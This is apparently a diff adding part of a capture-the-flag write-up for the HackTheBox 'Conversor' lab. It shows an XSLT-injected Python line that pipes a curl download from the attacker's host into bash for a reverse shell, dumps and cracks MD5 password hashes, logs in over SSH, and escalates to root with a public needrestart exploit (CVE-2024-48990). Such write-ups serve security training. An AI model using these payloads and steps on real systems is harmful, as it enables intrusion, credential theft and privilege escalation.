@@ -346,3 +346,204 @@ extension-element-prefixes="shell">
 		<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
 			import os os.system("curl 10.10.14.54:8000/shell.sh|bash") </shell:document> </xsl:template> </xsl:stylesheet>
 ```
+Once we set up a python http server, we host our malicious script and wait for a response. After a couple of seconds I am able to get a reverse shell.
+<img width="579" height="78" alt="image" src="https://github.com/user-attachments/assets/8f421407-6d6c-4eac-83a8-506e914f219c" />
+<img width="649" height="174" alt="image" src="https://github.com/user-attachments/assets/a686ee3d-d47c-4835-a7ca-00454cb35805" />
+
+We are currently logged in as the web service and not an actual user, so remembering that there was a database, I once again checked the `users.db` file and found that there are actually users within it.
+###### Users database
+```
+www-data@conversor:~/conversor.htb/instance$ cat users.db
+cat users.db
+�7����0�?tablefilesfilesCREATE TABLE files (
+        id TEXT PRIMARY KEY,
+        user_id INTEGER,
+        filename TEXT,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��tableusersusersCREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE,
+        password TEXT
+���zV,Mtestuser098f6bcd4621d373cade4e832627b4f6.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
+����
+��  testusersthack
+
+`�X�\
+
+�R
+U_371c58e9-18f2-4a23-863d-5a285de7d459371c58e9-18f2-4a23-863d-5a285de7d459.htmlR        U_c25728a7-af79-41e0-b916-a4e9861d9c0ec25728a7-af79-41e0-b916-a4e9861d9c0e.htmlU_1363be8b-c6c8-4227-92cc-1367b434fb141363be8b-c6c8-4227-92cc-1367b434fb14.htmlRU_c3f1ec9b-1b2c-49d2-96a6-33aff7028391c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlRU_f06dc183-e13f-4f4c-8389-7e414d7fe573f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlRU_0facc6c2-7625-4240-9dd0-d1085335224c0facc6c2-7625-4240-9dd0-d1085335224c.htmlRU_00508ffa-82dd-4c42-9867-7dd4a6b1660500508ffa-82dd-4c42-9867-7dd4a6b16605.htmlRU_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlRU_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlRU_8374be69-0931-4445-8f58-5589d27ec7d78374be69-0931-4445-8f58-5589d27ec7d7.html
+
+g]4�g�����
+          (U371c58e9-18f2-4a23-863d-5a285de7d459
+(Uc25728a7-af79-41e0-b916-a4e9861d9c0e  (U1363be8b-c6c8-4227-92cc-1367b434fb1(Uc3f1ec9b-1b2c-49d2-96a6-33aff7028391(Uf06dc183-e13f-4f4c-8389-7e414d7fe573(U0facc6c2-7625-4240-9dd0-d1085335224c(U00508ffa-82dd-4c42-9867-7dd4a6b16605(U89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b(Ua10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2'U     8374be69-0931-4445-8f58-5589d27ec7d7www-data@conversor:~/conversor.htb/instance$
+```
+
+I transferred this file over to kali using base64 and then used sqlite to check the contents of the database. I found two users with what looks like MD5 hashes for passwords, which are considered insecure due to their susceptibility to offline password-cracking attacks.
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
+└─$ sqlite3 users.db
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+files  users
+sqlite> SELECT * FROM users;
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|testuser|098f6bcd4621d373cade4e832627b4f6
+sqlite> 
+```
+
+Using hashcat, I was able to get a hit for the `fismathack` user `Keepmesafeandwarm`
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
+└─$ hashcat -a 0 -m 0 fismathack.hash /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-sandybridge-AMD Ryzen 9 7950X3D 16-Core Processor, 14991/30046 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
+Time.Started.....: Tue Oct 28 16:04:30 2025 (2 secs)
+Time.Estimated...: Tue Oct 28 16:04:32 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  7923.7 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10977280/14344385 (76.53%)
+Rejected.........: 0/10977280 (0.00%)
+Restore.Point....: 10969088/14344385 (76.47%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: KillerG-18 -> Karamba
+Hardware.Mon.#1..: Util: 15%
+
+Started: Tue Oct 28 16:04:29 2025
+Stopped: Tue Oct 28 16:04:34 2025
+```
+
+Using this user/pass combination I was able to log into ssh and get the user flag
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor]
+└─$ ssh fismathack@conversor.htb                                            
+The authenticity of host 'conversor.htb (10.129.248.22)' can't be established.
+ED25519 key fingerprint is SHA256:xCQV5IVWuIxtwatNjsFrwT7VS83ttIlDqpHrlnXiHR8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'conversor.htb' (ED25519) to the list of known hosts.
+fismathack@conversor.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Oct 28 08:07:29 PM UTC 2025
+
+  System load:  0.0               Processes:             221
+  Usage of /:   66.0% of 5.78GB   Users logged in:       0
+  Memory usage: 11%               IPv4 address for eth0: 10.129.248.22
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Oct 28 20:07:30 2025 from 10.10.14.54
+fismathack@conversor:~$ cat user.txt
+de6ef3c5809fc27c64322beee4da9fe0
+```
+
+Checking sudo permissions, we see this user can run needrestart as root
+```
+fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+```
+
+Looking online, I found this [github repository](https://github.com/ten-ops/CVE-2024-48990_needrestart)
+
+Knowing that I can't directly use the makefile on the box, I recreated the steps manually and started the listener script to detect if any root process starts needrestart.
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_9/conversor/CVE-2024-48990_needrestart]
+└─$ cat makefile                 
+all: lib exploit
+
+lib:
+        @mkdir -p build
+        @mkdir -p /tmp/attacker/importlib
+        @nasm -f elf64 src/main.asm -o build/main.o
+        @ld -O3 -shared -z notext -nostdlib build/main.o -o /tmp/attacker/importlib/__init__.so
+
+exploit: src/main.asm
+        @chmod +x src/listener.sh
+        @bash src/listener.sh
+
+clean:
+        @rm -rf build exploit main *.o
+```
+
+So running the listener and running the command "sudo needrestart -r a", I was able to obtain root and get the flag.
+```
+fismathack@conversor:~/CVE-2024-48990_needrestart/src$ bash listener.sh
+Root obtained!, clear traces ...
+ls
+importlib  subprocess.py
+cat /root/root.txt
+8ea23b78f7f52013e6d4a136d07e854e
+```
